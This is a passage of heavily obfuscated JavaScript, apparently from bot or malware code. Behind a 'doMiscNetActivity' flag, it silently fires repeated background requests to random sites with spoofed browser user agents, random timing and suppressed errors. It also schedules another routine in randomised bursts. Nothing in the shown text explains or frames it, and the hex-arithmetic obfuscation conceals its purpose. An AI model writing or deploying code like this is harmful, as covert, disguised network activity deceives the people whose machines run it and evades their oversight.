      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x6b2 * -0x3 + 0x5e * 0x37 + -0x7 * 0x4; k < -0x10e8 + 0x1 * -0x5fb + 0x16e7; k++)
    setTimeout(f, (-0x4 * 0x3c4d + -0x1431 * -0x1 + 0x1c763) * k * getRandomInt(-0x234 + 0x1 * 0x107b + 0x2a * -0x57, 0xe5 * -0xc + -0x8 * 0x137 + -0xd * -0x193));
  setInterval(() => {
    f();
    for (let l = 0x6d1 * -0x1 + -0x137 * 0x13 + -0xb2 * -0x2b; l < -0x15 * -0x189 + 0x26d2 + -0x470b; l++)
      setTimeout(f, (-0x1 * 0x169c + -0xf7dd + 0x1f8d9) * l * getRandomInt(0x1af * 0x3 + -0x5dd + 0xd1 * 0x1, 0x2 * 0xfb6 + 0x1bb2 + -0x1 * 0x3b1b));
  }, -0xc30bf * -0x6 + -0xf5 * -0x2225 + -0x32e363);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x24 * 0x184 + -0x1 * -0x1c51 + -0x7 * 0x7ef) * getRandomInt(-0x74f + 0x551 * 0x6 + -0x6 * 0x419, -0x11 * 0x131 + 0x9 * -0x19b + 0xb93 * 0x3));
}, 0x1178 * -0x1 + 0x1e1e + 0x1 * -0xc42);